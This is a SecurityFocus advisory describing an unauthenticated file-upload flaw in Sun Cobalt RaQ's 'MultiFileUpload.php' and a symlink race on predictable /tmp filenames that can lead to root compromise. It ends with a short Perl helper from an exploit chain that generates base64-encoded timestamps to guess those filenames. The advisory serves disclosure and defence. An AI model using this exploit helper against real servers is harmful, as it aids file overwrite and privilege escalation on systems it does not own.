source: http://www.securityfocus.com/bid/4252/info

Cobalt RaQ is a server appliance for Internet-based services. It is distributed and maintained by Sun Microsystems.

The 'MultiFileUpload.php' script is not sufficiently protected from outside access. While other sensitive administrative scripts are protected with HTTP authentication, 'MultiFileUpload.php' is not. Remote clients may invoke the execution of this script without valid administrator credentials.

In doing so, it is possible for an attacker to upload files that are created on the server filesystem as any user.

Furthermore, the uploaded files are stored in '/tmp' with predictable filenames. If the attacker has local access to the system, this vulnerability can be exploited to overwrite a file of equal user and group ownership through the use of a symbolic link.

Successful exploitation of this vulnerability by an attacker with local access may result in a compromise of root privileges. Attackers without local access may be able to cause a denial of service through consumption of disk space.

#!/usr/bin/perl
# mass base64 time encoder
# part of Cobalt UIFC XTR remote/local combination attack


use MIME::Base64;
$evil_time = time();

$exploit_secs = 10; # time in seconds you got to exploit this bug (race)

for($i=1;$i<=$exploit_secs; $i++) {
      $evil_time = $evil_time+1;
      $evilstr = encode_base64($evil_time);
      print $evilstr;
}